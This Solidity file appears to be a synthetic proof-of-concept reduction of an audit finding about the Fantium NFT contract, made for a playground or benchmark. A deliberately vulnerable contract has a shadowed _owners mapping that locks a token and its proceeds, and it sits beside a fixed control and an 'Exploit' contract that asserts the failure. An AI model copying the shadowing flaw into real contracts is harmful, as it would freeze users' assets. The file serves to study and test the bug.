// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Fantium — FantiumNFTV1._owners shadows ERC721Upgradeable._owners
    (MixBytes, finding 28052)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: FantiumNFTV1 declares its own `_owners` mapping, which hides
    ERC721Upgradeable's private `_owners`. Mint writes the ERC721 mapping.
    exists() reads the child mapping, so a minted token looks unminted and the
    real owner of token 1000000 cannot transfer it or claim its proceeds. */

contract Proceeds {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ERC721Upgradeable {
    mapping(uint256 => address) private _owners;
    mapping(address => uint256) private _balances;

    function ownerOf(uint256 tokenId) public view returns (address) {
        return _owners[tokenId];
    }

    function _mint(address to, uint256 tokenId) internal {
        require(to != address(0), "zero");
        require(_owners[tokenId] == address(0), "minted");
        _balances[to] += 1;
        _owners[tokenId] = to;
    }

    function _transfer(address from, address to, uint256 tokenId) internal {
        require(_owners[tokenId] == from, "not owner");
        require(to != address(0), "zero to");
        _balances[from] -= 1;
        _balances[to] += 1;
        _owners[tokenId] = to;
    }
}

contract FantiumNFTV1 is ERC721Upgradeable {
    Proceeds public token;
    uint256 public proceeds;

    // Child mapping. Same name as ERC721Upgradeable._owners, different slot.
    mapping(uint256 => address) internal _owners;

    constructor(Proceeds token_) {
        token = token_;
    }

    function exists(uint256 _tokenId) public view returns (bool) {
        // @> VULN: reads FantiumNFTV1._owners, which mint never writes
        return _owners[_tokenId] != address(0);
    }

    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }

    function note(uint256 amount) external {
        proceeds += amount;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(exists(tokenId), "nonexistent");
        require(msg.sender == from, "sender");
        _transfer(from, to, tokenId);
    }

    function claim(uint256 tokenId) external {
        require(exists(tokenId), "nonexistent");
        require(ownerOf(tokenId) == msg.sender, "not owner");
        uint256 amount = proceeds;
        proceeds = 0;
        require(token.transfer(msg.sender, amount), "pay");
    }
}

/// Control: one owner mapping. exists() and mint share it.
contract FantiumOneOwner {
    Proceeds public token;
    uint256 public proceeds;
    mapping(uint256 => address) internal _owners;

    constructor(Proceeds token_) {
        token = token_;
    }

    function ownerOf(uint256 tokenId) public view returns (address) {
        return _owners[tokenId];
    }

    function exists(uint256 _tokenId) public view returns (bool) {
        return _owners[_tokenId] != address(0);
    }

    function mint(address to, uint256 tokenId) external {
        require(to != address(0), "zero");
        require(_owners[tokenId] == address(0), "minted");
        _owners[tokenId] = to;
    }

    function note(uint256 amount) external {
        proceeds += amount;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(exists(tokenId), "nonexistent");
        require(_owners[tokenId] == from, "not owner");
        require(msg.sender == from, "sender");
        require(to != address(0), "zero to");
        _owners[tokenId] = to;
    }

    function claim(uint256 tokenId) external {
        require(exists(tokenId), "nonexistent");
        require(_owners[tokenId] == msg.sender, "not owner");
        uint256 amount = proceeds;
        proceeds = 0;
        require(token.transfer(msg.sender, amount), "pay");
    }
}

contract Holder {
    function tryTransfer(address nft, address to, uint256 id) external returns (bool ok) {
        (ok,) = nft.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), to, id));
    }

    function tryClaim(address nft, uint256 id) external returns (bool ok) {
        (ok,) = nft.call(abi.encodeWithSignature("claim(uint256)", id));
    }
}

contract Exploit {
    uint256 public constant TOKEN_ID = 1_000_000;
    uint256 public constant PROCEEDS_AMT = 1_000_000 ether;

    Proceeds public token;
    FantiumNFTV1 public nft;
    Holder public alice;
    address public constant BOB = address(0xB0B);

    bool public existsFlag;
    bool public ownerMoved;
    bool public ownerClaimed;
    uint256 public stuck;
    address public realOwner;

    bool public controlExists;
    bool public controlMoved;
    bool public controlClaimed;
    bool public controlAttackerMoved;
    address public controlOwner;
    uint256 public controlAliceBalance;

    constructor() {
        token = new Proceeds();
        nft = new FantiumNFTV1(token);
        alice = new Holder();
    }

    function run() external {
        token.mint(address(nft), PROCEEDS_AMT);
        nft.mint(address(alice), TOKEN_ID);
        realOwner = nft.ownerOf(TOKEN_ID);
        existsFlag = nft.exists(TOKEN_ID);
        nft.note(PROCEEDS_AMT);
        ownerMoved = alice.tryTransfer(address(nft), BOB, TOKEN_ID);
        ownerClaimed = alice.tryClaim(address(nft), TOKEN_ID);
        stuck = token.balanceOf(address(nft));
        require(realOwner == address(alice), "owner");
        require(existsFlag == false, "exists");
        require(ownerMoved == false, "moved");
        require(nft.ownerOf(TOKEN_ID) == address(alice), "still");
        require(ownerClaimed == false, "claimed");
        require(stuck == PROCEEDS_AMT, "stuck");
        require(TOKEN_ID == 1_000_000, "id");
    }

    function runControl() external {
        FantiumOneOwner fixedNft = new FantiumOneOwner(token);
        token.mint(address(fixedNft), PROCEEDS_AMT);
        fixedNft.mint(address(alice), TOKEN_ID);
        controlExists = fixedNft.exists(TOKEN_ID);
        fixedNft.note(PROCEEDS_AMT);
        controlClaimed = alice.tryClaim(address(fixedNft), TOKEN_ID);
        controlMoved = alice.tryTransfer(address(fixedNft), BOB, TOKEN_ID);
        (controlAttackerMoved,) = address(fixedNft).call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(alice), address(this), TOKEN_ID)
        );
        controlOwner = fixedNft.ownerOf(TOKEN_ID);
        controlAliceBalance = token.balanceOf(address(alice));
        require(controlExists == true, "c-exists");
        require(controlClaimed == true, "c-claim");
        require(controlMoved == true, "c-move");
        require(controlAttackerMoved == false, "c-attacker");
        require(controlOwner == BOB, "c-owner");
        require(controlAliceBalance == PROCEEDS_AMT, "c-paid");
    }
}
